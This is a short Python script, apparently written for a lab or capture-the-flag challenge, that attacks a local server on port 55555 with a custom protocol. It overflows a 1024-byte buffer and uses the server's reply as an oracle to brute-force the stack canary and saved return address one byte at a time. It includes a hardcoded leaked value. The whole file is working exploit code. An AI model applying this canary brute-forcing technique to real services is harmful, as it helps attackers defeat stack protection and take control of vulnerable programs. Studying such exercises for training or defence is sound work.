#!/usr/bin/python3
import socket as S
from binascii import hexlify, unhexlify
from struct import pack, unpack

#Overflow the stack with some data,
#return True if the data is correct
#	- right stack cookie
#	- right return address

def oracle(username=b'toto', data=b'', timeout=0.5):
	try:
		# Connect to the server
		s = S.socket(S.AF_INET, S.SOCK_STREAM)
		if timeout:
			s.settimeout(timeout)
		s.connect(('127.0.0.1', 55555))

		# Do hello
		s.send(pack("<H", 0));
		s.send(username);
		hello = s.recv(100);
		print ("Server Hello: %s"%hello.decode())

		# Do ping-pong
		s.send(pack("<H", 1));
		buf = b'A'*1024
		buf += data

		s.send(pack("<H", len(buf)));
		s.send(buf)
		rep = s.recv(len(buf));
		print ("Server pong : %s"%repr(rep))

		if rep != buf:
			print ("Bad pong reply")
			return False

		s.send(pack("<H", 2));
		bye = s.recv(100);
		print("Server bye : %s"%bye.decode())
		if bye != b'Bye toto': 
			return False

		# Close connection
		s.close()
	except :
		#print ("Network Exception")
		return False

	return True

def bruteforce_stack(size):
	data = b''
	while len(data) < size:
		found = False
		for b in range(256):
			send_data = data + bytes((b,))
			if oracle(data=send_data):
				data = send_data
				found = True
				break
		assert(found == True)
		print ("Data: %s"%hexlify(data))
	return data

def main():
	# data = bruteforce_stack(8)
	# data = b'00fe4a2e907fc760'
	data = unhexlify('006f0b6ff45f5f56')

	p1, p2 = unpack("<II", data)
	#print ("p1=%x p2=%x"%(p1,p2))

	#data = pack("<II", p1, p2)
	#print(hexlify(data))
	
	canary = bruteforce_stack(4)

	

	#print(oracle(username=b'toto', data=b''))
	#print(oracle(username=b'toto', data=b'X'*42))
	

if __name__ == '__main__': main()
